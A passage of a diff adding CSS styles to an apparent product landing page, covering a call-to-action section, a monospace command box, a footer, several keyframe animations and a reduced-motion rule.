+      padding: 0 0 28px;
+    }
+    .t-mcp .tile-text {
+      padding: 0 28px;
+    }
+  }
+
+  /* CTA */
+  .cta {
+    position: relative;
+    border-top: 1px solid var(--line);
+    padding: 120px 0 140px;
+    overflow: hidden;
+  }
+  .cta-inner {
+    position: relative;
+    text-align: center;
+  }
+  .h-cta {
+    margin: 0;
+    font-size: clamp(36px, 5vw, 60px);
+    font-weight: 600;
+    letter-spacing: -0.035em;
+  }
+  .cmd {
+    display: inline-block;
+    margin-top: 36px;
+    border: 1px solid var(--line-2);
+    border-radius: 12px;
+    padding: 12px 18px;
+    font-family: var(--font-mono);
+    font-size: 13.5px;
+    color: var(--text);
+    background: rgba(255, 255, 255, 0.02);
+    max-width: 100%;
+    overflow-wrap: anywhere;
+  }
+  .cmd span {
+    color: var(--faint);
+  }
+
+  .foot {
+    border-top: 1px solid var(--line);
+    padding: 28px 0;
+    font-size: 13px;
+  }
+  .foot-inner {
+    display: flex;
+    justify-content: space-between;
+    gap: 16px;
+  }
+
+  @keyframes blink {
+    50% {
+      opacity: 0.3;
+    }
+  }
+  @keyframes travel {
+    0% {
+      left: 0;
+      opacity: 0;
+    }
+    15%,
+    85% {
+      opacity: 1;
+    }
+    100% {
+      left: calc(100% - 7px);
+      opacity: 0;
+    }
+  }
+  @keyframes chip {
+    0%,
+    100% {
+      color: var(--muted);
+      border-color: var(--line-2);
+    }
+    12%,
+    30% {
+      color: var(--text);
+      border-color: rgba(61, 219, 217, 0.6);
+      box-shadow: 0 0 16px -4px rgba(61, 219, 217, 0.5);
+    }
+  }
+  @keyframes dash {
+    to {
+      stroke-dashoffset: -14;
+    }
+  }
+  @media (prefers-reduced-motion: reduce) {
+    .proto *,
+    .proto *::before {
+      animation: none !important;
+      transition: none !important;
+    }
+  }
+</style>
